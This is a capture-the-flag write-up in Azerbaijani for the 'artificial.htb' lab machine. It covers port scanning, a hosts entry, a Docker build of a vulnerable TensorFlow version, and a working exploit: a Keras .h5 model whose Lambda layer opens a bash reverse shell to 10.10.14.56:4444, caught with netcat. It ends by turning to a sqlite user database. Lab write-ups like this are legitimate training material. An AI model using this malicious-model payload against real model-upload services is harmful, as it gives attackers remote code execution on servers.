Ilk olaraq hemiseki kimi nmap ile port scan edirik

<img width="1131" height="632" alt="image" src="https://github.com/user-attachments/assets/354a81a6-66f1-4f35-8858-28e789bc0202" />

burda goruruk ki 80 portunda nginx web server islekdi browser'de hemin IP'ye request atiriq

<img width="1802" height="1193" alt="image" src="https://github.com/user-attachments/assets/b00168a8-f897-40c5-a217-bb4fa750cbf4" />

bu o demekdir ki nginx'de web server'e IP uzerinden sorgu elcatan deyil hosts faylina elave etmeliyik bu domaini

bunun ucun asagidaki kommandi ise saliriq ki hosts faylina getsin dussun domain

echo '10.10.11.74 artificial.htb' | sudo tee -a /etc/hosts

<img width="2579" height="1493" alt="image" src="https://github.com/user-attachments/assets/02869bb5-11a2-4dfe-ac1c-e6a4dc57d4b5" />

indi ise web sayti enumarate etmeliyik gorek neler var saytda

saytda ilk once qeydiyyatdan kecek gorek neler var

<img width="983" height="1050" alt="image" src="https://github.com/user-attachments/assets/e66c7fa5-badb-49c7-9386-eeadc79a9bea" />

<img width="1498" height="1044" alt="image" src="https://github.com/user-attachments/assets/0a046e33-5516-4894-a022-6a060b58bf51" />

bu sehife bizden model upload etmeyimizi isteyir ve sekilde qeyd edilen versiyada kitabxananin yuklu olmali oldugunu qeyd edir

<img width="1465" height="748" alt="image" src="https://github.com/user-attachments/assets/ce19eb98-cdf1-458b-9eac-f97e9fed47ea" />

bu python kitabxanasi AI model train etmek ucun istifade edilir tez versiyaya uygun bir bosluq var mi yoxmu onu arasdiririq metasploit'de

<img width="1058" height="742" alt="image" src="https://github.com/user-attachments/assets/e563c7d1-b76f-4bbe-8b44-ee4a76762c8f" />

her hansi bir exploit yoxdu ama google var oldugunu deyir

FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]

bize verdiyi docker ile yukleyirik 

docker'i ayaga qaldiririq

<img width="1059" height="704" alt="image" src="https://github.com/user-attachments/assets/2b1b7d20-a1e2-4d7b-9dc5-200cf422a333" />

sudo docker build -t tensorflow-cpu-2.13.1 .

docker images

<img width="1327" height="339" alt="image" src="https://github.com/user-attachments/assets/d7dd8fc4-76f7-464b-ba7e-69ef73d62265" />

test TensorFlow installation

docker run -it --rm tensorflow-cpu-2.13.1 python -c "import tensorflow as tf; print('TensorFlow version:', tf.__version__)"

<img width="1405" height="393" alt="image" src="https://github.com/user-attachments/assets/7cf2eaae-7fc0-44a2-a09e-00e91b2de994" />

demek biz artiq tensorflow'un vuln versiyasinda bir docker qaldirmisiq ve bu container'e daxil olaraq orada zererli bir model yaratmaliyiq reverse shell almaq ucun daha sonra upload ede bilek deye

ilk olaraq container'e daxil oluruq

docker run --rm -it tensorflow-cpu-2.13.1 /bin/bash

<img width="920" height="129" alt="image" src="https://github.com/user-attachments/assets/06fa670b-ac96-4d51-ae22-a0d5ca8e80e5" />


daha sonra zererli exploit'i hazir edirik

upload .h5 fayl formatini desteklediyi ucun asagidaki python kodu bize komeklik edecek

docker run --rm -v /home/kali:/code tensorflow-cpu-2.13.1 python -c "
import tensorflow as tf

def exploit(x):
    import os
    os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.56/4444 0>&1\"')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save('/code/exploit.h5')
print('Exploit model saved to /home/kali/exploit.h5')
"

<img width="1255" height="1030" alt="image" src="https://github.com/user-attachments/assets/dfeaaa36-cc6c-45eb-8f34-db533dda09f9" />

nc -nvlp 4444

fayli upload edirik ve daha sonra view butonuna basdiqda bizim daha onceden acmis oldugumu netcat listener'imze shell gelmis olur
  
<img width="1236" height="539" alt="image" src="https://github.com/user-attachments/assets/e711a833-44e0-4e80-9c56-2ea0bbf0c995" />

<img width="792" height="245" alt="image" src="https://github.com/user-attachments/assets/2a3218bd-487d-4930-ab0e-b32055fbdd25" />


iki eded istifadeci var biz indi gael adinda istifadeciye daxil olmaliyiq bu boyuk ehtimalla database faylinin icerisinde parolu var ve biz onunla ssh ile qosulmaliyiq

<img width="825" height="131" alt="image" src="https://github.com/user-attachments/assets/18e04cf3-23bf-4c06-9ad0-b3f4c9cb6136" />

sqlite users.db
